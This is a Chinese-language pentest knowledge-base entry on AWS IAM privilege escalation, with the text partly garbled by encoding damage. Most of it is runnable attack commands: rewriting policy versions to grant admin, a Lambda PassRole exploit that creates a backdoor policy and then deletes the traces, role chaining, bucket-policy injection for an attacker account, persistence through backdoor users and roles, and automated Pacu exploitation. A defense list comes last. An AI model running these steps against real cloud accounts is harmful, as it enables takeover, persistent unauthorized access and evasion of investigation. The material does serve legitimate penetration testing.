# IAM Privilege Escalation Techniques

**ID**: `cloud-iam-001` | **分类**: cloud | **风险等级**: critical

AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了低权?IAM 凭证后，通过分析和利?IAM 策略配置错误，可以提升到管理员权限。Rhino Security Labs 定义?30+ ?IAM 权限提升路径（参?https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/）。最常见的路径包括：(1) iam:CreatePolicyVersion ?创建新版本策略并设为默认?2) iam:PassRole + 服务创建权限 ?通过 Lambda、EC2、Glue 等服务以高权限角色执行代码；(3) sts:AssumeRole ?担任权限更高的角色；(4) iam:PutUserPolicy/AttachUserPolicy ?直接修改自己的策略。此外，资源基础策略（如 S3 bucket policy、SQS queue policy、Lambda resource policy）中的宽?Principal 配置也可被利用。权限提升的关键在于枚举当前凭证的有效权限（iam:GetUser、iam:ListAttachedUserPolicies、iam:SimulatePrincipalPolicy），然后找到可提权的路径

## 触发场景

- 已获?AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权
- 目标 IAM 用户附加了多?managed policy ?inline policy，可能存在权限重叠或遗漏
- 发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限
- 目标 IAM policy 允许 iam:CreatePolicyVersion 且未限制 set-as-default
- 存在跨账户信任关系，可通过 sts:AssumeRole 进行角色链攻
- Lambda 函数配置了高权限执行角色，可通过修改函数代码以该角色执行
- 发现 IAM 凭证泄露（GitHub 泄露、配置文件泄露、日志泄露）
- 资源基础策略（Resource-based Policy）中存在宽松?Principal 配置

## 操作检查清单

1. 使用 sts:get-caller-identity 确认当前身份、账?ID ?ARN
2. 枚举当前用户权限：iam:list-attached-user-policies、iam:list-user-policies
3. 获取每个策略的详细内容：iam:get-policy-version
4. 使用 iam:simulate-principal-policy 测试潜在提权权限
5. 检查是否有 iam:CreatePolicyVersion + set-as-default 的提权路
6. 检查是否有 iam:PassRole 权限，并枚举可用的高权限角色
7. 检查是否有 sts:AssumeRole 权限，并分析目标角色的信任策
8. 检查是否有 iam:PutUserPolicy/AttachUserPolicy 权限直接提权
9. 检?Lambda 函数执行角色权限，评?Lambda 提权路径
10. 检查资源基础策略（S3 bucket policy、SQS policy、Lambda policy
11. 使用 Pacu 自动化检测和利用所有可用提权路
12. 提权后验证新权限：aws sts get-caller-identity、aws iam list-users

## 技术手段

- iam:CreatePolicyVersion ?创建策略新版本并设为默认，直接修改策略权
- iam:PassRole + lambda:CreateFunction ?创建 Lambda 函数以高权限角色执行代码
- iam:PassRole + ec2:RunInstances ?创建 EC2 实例以高权限角色执行命令
- iam:PassRole + glue:CreateJob ?创建 Glue Job 以高权限角色执行代码
- sts:AssumeRole ?直接担任更高权限的角
- iam:PutUserPolicy ?添加 inline policy 到当前用
- iam:AttachUserPolicy ?附加 managed policy 到当前用
- iam:UpdateLoginProfile ?修改其他用户的控制台密码
- iam:CreateAccessKey ?为高权限用户创建新的 AccessKey
- iam:AddUserToGroup ?将当前用户加入高权限
- 资源基础策略注入 ?修改 S3 bucket policy ?Lambda resource policy 放宽权限
- 角色链提??通过多个账户间的 AssumeRole 形成角色
- Lambda Layer 注入 ?创建包含恶意代码?Lambda Layer 并附加到目标函数

## 症状

- IAM 用户附加了多?managed policy，其中至少一个包?iam: 权限
- 用户?iam:CreatePolicyVersion 权限但策略文档中缺少限制条件
- 用户?iam:PassRole 权限且能列出高权?IAM 角色
- 用户?sts:AssumeRole 权限且信任策略未限制 source account
- Lambda 函数的执行角色包?AdministratorAccess 或敏感权
- S3 bucket policy ?SQS queue policy ?Principal ?"*" 或包含攻击者账
- 用户?iam:UpdateLoginProfile 权限，可修改其他用户的密?

## 根因分析

- 管理员使用通配符权限（?"Action": "iam:*"）而非最小权限原
- 策略中缺?Condition 限制，允许无约束?iam:CreatePolicyVersion
- iam:PassRole 权限未限制具体的角色 ARN 或服务（"Resource": "*"
- sts:AssumeRole 信任策略未限制外部账户（允许任意账户 assume
- Lambda 函数创建时使用了高权限角色，且函数代码用户可
- 资源基础策略未正确验?Principal，导致跨账户权限泄露
- IAM policy 版本管理：CreatePolicyVersion 最多允?5 个版本，攻击者可创建新版本覆盖原有策
- Service Control Policies (SCP) 未正确配置，无法阻止权限提升操作

## 示例

### iam:CreatePolicyVersion 权限提升

利用 iam:CreatePolicyVersion 创建新策略版本并设为默认，将当前用户策略修改为管理员权限

```
# 1. 确认当前用户?CreatePolicyVersion 权限
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name current-user

# 2. 获取当前策略?ARN（假设为 arn:aws:iam::123456789012:policy/MyPolicy）
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --version-id v1

# 3. 创建新的策略版本（管理员权限）
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default

# 4. 验证新权限已生效
aws iam list-users
aws s3 ls

# 注意：每个策略最?5 个版本，可能需要先删除旧版本
aws iam delete-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --version-id v1
```

### iam:PassRole + Lambda 函数权限提升

利用 iam:PassRole ?lambda:CreateFunction 权限，创建以高权限角色执行的 Lambda 函数

```
# 1. 枚举可用?IAM 角色
aws iam list-roles --query "Roles[].{ARN:Arn,Name:RoleName}" --output table

# 2. 检查目标角色的权限（假设为 AdminRole）
aws iam list-attached-role-policies --role-name AdminRole
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy \
  --version-id v1

# 3. 确认当前用户?PassRole 权限
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/current-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::123456789012:role/AdminRole

# 4. 创建恶意 Lambda 函数代码
cat > exploit.py << 'PYEOF'
import boto3, json
def lambda_handler(event, context):
    client = boto3.client("iam")
    # 创建新的管理员策略
    client.create_policy(
        PolicyName="BackdoorPolicy",
        PolicyDocument=json.dumps({
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }]
        })
    )
    return {"status": "done"}
PYEOF

zip exploit.zip exploit.py

# 5. 创建 Lambda 函数（使?AdminRole）
aws lambda create-function \
  --function-name escalate \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler exploit.lambda_handler \
  --zip-file fileb://exploit.zip

# 6. 触发函数执行
aws lambda invoke --function-name escalate response.json

# 7. 清理痕迹
aws lambda delete-function --function-name escalate
rm exploit.py exploit.zip
```

### sts:AssumeRole 角色链提

通过 sts:AssumeRole 担任更高权限的角色，可能涉及多账户角色链

```
# 1. 发现可用的角色和信任关系
aws iam list-roles --query "Roles[].{ARN:Arn,TrustPolicy:AssumeRolePolicyDocument}" \
  --output json | jq '.[] | select(.TrustPolicy.Statement[].Principal.AWS | contains("123456789012"))'

# 2. 检查目标角色的信任策略
aws iam get-role --role-name TargetRole --query "Role.AssumeRolePolicyDocument"

# 3. 如果信任策略包含当前账户或用户，执行 AssumeRole
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name escalation-session

# 4. 获取临时凭证
# 返回: {AccessKeyId, SecretAccessKey, SessionToken}

# 5. 使用临时凭证
export AWS_ACCESS_KEY_ID={AccessKeyId}
export AWS_SECRET_ACCESS_KEY={SecretAccessKey}
export AWS_SESSION_TOKEN={SessionToken}
aws sts get-caller-identity

# 6. 跨账户角色链
# Account A (当前) ?AssumeRole ?Account B (中间) ?AssumeRole ?Account A (管理?
aws sts assume-role \
  --role-arn arn:aws:iam::999999999999:role/CrossAccountRole \
  --role-session-name chain-1

# 使用 Account B 的凭证继续
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name chain-2

# 7. 注意检查角色是否要?MFA
# 如果 trust policy 中有 "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
# 则需?MFA token 才能 assume
```

### iam:PutUserPolicy 直接策略注入

利用 iam:PutUserPolicy ?iam:AttachUserPolicy 直接向当前用户添加管理员策略

```
# 1. 确认当前用户?PutUserPolicy 权限
aws sts get-caller-identity

# 2. 使用 PutUserPolicy 添加 inline policy
aws iam put-user-policy \
  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \
  --policy-name escalation-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'

# 3. 或使?AttachUserPolicy 附加 managed policy
aws iam attach-user-policy \
  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 4. 验证权限已生效
aws iam list-users
aws ec2 describe-instances

# 5. 持久化：创建新的 AccessKey
aws iam create-access-key \
  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2)

# 6. 或为 root 账户创建 AccessKey（如果可能）
aws iam create-access-key --user-name root
```

### 资源基础策略（Resource-based Policy）利

利用 S3 bucket policy、SQS queue policy ?Lambda resource policy 中的宽松配置获取权限

```
# 1. 检?S3 bucket policy 中是否有宽松 Principal
aws s3api get-bucket-policy --bucket target-bucket --output text | jq

# 2. 如果 bucket policy 允许 PutBucketPolicy，注入新策略
aws s3api put-bucket-policy --bucket target-bucket --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "Backdoor",
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"},
    "Action": "s3:*",
    "Resource": ["arn:aws:s3:::target-bucket", "arn:aws:s3:::target-bucket/*"]
  }]
'}'

# 3. 检?SQS queue policy
aws sqs get-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/my-queue \
  --attribute-names Policy

# 4. 检?Lambda resource policy
aws lambda get-policy --function-name target-function

# 5. 如果 Lambda resource policy 允许 lambda:InvokeFunction
# 可调用目标函数，可能触发敏感操作
aws lambda invoke \
  --function-name target-function \
  --payload '{"action": "admin"}' \
  response.json

# 6. 利用 IAM Role Trust Policy
# 如果角色信任策略?Principal 为任意账户（未限?ExternalId）
# 可从外部账户 assume 该角色
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/VulnerableRole \
  --role-session-name cross-account-attack
```

### IAM 凭证滥用与持久化

利用已获取的 IAM 凭证进行权限探测、横向移动和持久化访

```
# 1. 确认当前身份和权限范围
aws sts get-caller-identity

# 2. 枚举所?IAM 用户和角色
aws iam list-users --query "Users[].{Name:UserName,ARN:Arn}"
aws iam list-roles --query "Roles[].{Name:RoleName,ARN:Arn}"

# 3. 枚举所有策略
aws iam list-policies --scope Local --query "Policies[].Arn"

# 4. 检?EC2 实例配置文件（可能包含高权限角色）
aws ec2 describe-instances --query "Reservations[].Instances[].IamInstanceProfile"

# 5. 检查是否存?Lambda 函数可修改
aws lambda list-functions --query "Functions[].{Name:FunctionName,Role:Role}"

# 6. 持久化方?1：创建新?IAM 用户
aws iam create-user --user-name backdoor-user
aws iam attach-user-policy \
  --user-name backdoor-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-user

# 7. 持久化方?2：修改现有用户的策略
aws iam put-user-policy \
  --user-name admin-user \
  --policy-name backdoor \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# 8. 持久化方?3：创?IAM 角色
aws iam create-role \
  --role-name backdoor-role \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"},
      "Action": "sts:AssumeRole"
    }]
  }'
aws iam attach-role-policy \
  --role-name backdoor-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 使用 Pacu 自动?IAM 权限提升

使用 Pacu 框架自动化检测和利用 IAM 权限提升路径

```
# 1. 安装 Pacu
pip install pacu
pacu

# 2. 配置已获取的凭证
Pacu (my_session) > set_keys
Please input an Access Key ID: AKIAxxxxxxxxxxxx
Please input a Secret Access Key: xxxxxxxxxxxxxxxxxxxxxx
Please input a Session Token (optional): xxxxxxx
Please input a region (optional, default: us-east-1):

# 3. 枚举当前权限
Pacu (my_session) > run iam__enum_permissions
# 输出当前用户的所有权限列表

# 4. 检测权限提升路径
Pacu (my_session) > run iam__privesc_scan
# 自动检测所有可用的提权路径并列出利用方法

# 5. 执行提权
Pacu (my_session) > run iam__privesc_scan --privesc
# 自动执行检测到的提权路径

# 6. 查看可用模块
Pacu (my_session) > ls
# 常用模块:
#   iam__enum_users - 枚举 IAM 用户
#   iam__enum_roles - 枚举 IAM 角色
#   iam__backdoor_assume_role - 在角色中创建后门
#   lambda__backdoor_new_roles - 为新角色添加后门策略
#   ec2__startup_shell_script - 通过 EC2 user-data 执行命令

# 7. 导出结果
Pacu (my_session) > export_creds
# 导出提权后获取的所有凭?
```

## 成功标志

- 成功获取 AdministratorAccess 或等效高权限
- 能够列出所?IAM 用户和角色（之前无法访问
- 能够创建/删除 IAM 实体（用户、角色、策略）
- 能够访问 S3、EC2 等其?AWS 服务的所有资
- sts:get-caller-identity 显示已切换到高权限角
- 临时凭证在有效期内且权限正确

## 防御建议

- 遵循最小权限原则，禁止使用 "Action": "*" ?"iam:*" 通配符策
- ?iam:CreatePolicyVersion 添加 Condition 限制（如要求 MFA、限制特?IP
- 严格限制 iam:PassRole 权限：指定具体角?ARN 和服务，禁止 "Resource": "*"
- 在角色信任策略中使用 ExternalId 防止 confused deputy 攻击
- 启用 AWS Organizations SCP 在组织级别阻止危?IAM 操作
- 为所?IAM 实体设置 Permissions Boundary，限制最大权限范
- 定期审查 IAM 策略，使?IAM Access Analyzer 检测过度授
- 启用 CloudTrail 对所?IAM 操作进行日志记录和告
- 对敏感角色启?MFA 要求?Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
- 使用 AWS IAM credential report 定期检查未使用的凭
- 实施 IAM policy 版本管理审计，监控策略版本变
- 限制 sts:AssumeRole 的信任策略，明确指定允许?Principal ?Condition
